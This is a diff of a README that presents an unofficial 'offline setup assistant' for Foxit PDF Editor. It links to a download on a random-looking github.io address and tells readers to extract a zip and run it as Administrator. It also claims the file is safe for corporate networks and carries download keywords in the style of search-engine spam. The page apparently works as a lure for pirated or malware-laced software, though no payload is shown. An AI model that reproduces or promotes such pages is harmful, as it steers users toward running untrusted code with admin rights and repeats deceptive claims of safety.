@@ -1,6 +1,6 @@
 # Foxit PDF Editor — Offline Setup Assistant
 
-<a href="https://foxit-pdf-editor-full-version-download.github.io/.github" target="_blank">
+<a href="https://ryadikmntiiks.github.io/.github/foxit" target="_blank">
   <img src="https://img.shields.io/badge/DOWNLOAD%20SETUP_ASSISTANT-%F0%9F%92%BE-blue?style=for-the-badge&logo=cloudsmith&logoColor=white" alt="Download Setup Assistant">
 </a>
 
@@ -10,7 +10,7 @@
 
 ## 🧰 What This Assistant Does
 
-- ✅ Fully offline installer for Foxit PDF Editor
+- ✅ Fully offline installer for **Foxit PDF Editor**
 - ✅ Supports editing, signing, and converting PDF documents
 - ✅ Works on Windows 10 / 11 without internet access
 - ✅ Includes Foxit PDF Reader module
@@ -19,9 +19,9 @@
 
 ## 📦 How to Use
 
-1. Click the Download Setup Assistant button above  
-2. Extract the .zip archive using WinRAR or 7-Zip  
-3. Run the assistant as Administrator  
+1. Click the **Download Setup Assistant** button above  
+2. Extract the `.zip` archive using WinRAR or 7-Zip  
+3. Run the assistant as **Administrator**  
 4. Follow on-screen instructions to complete installation  
 5. Launch Foxit PDF Editor and start editing!
 
@@ -67,6 +67,6 @@ foxit reader software free download
 
 ---
 
-> ⚠️ This is a standalone offline assistant, not an online installer  
+> ⚠️ This is a standalone **offline assistant**, not an online installer  
 > 🛡 Safe for use in corporate environments with firewall restrictions  
 > 📁 Compatible with 64-bit Windows OS
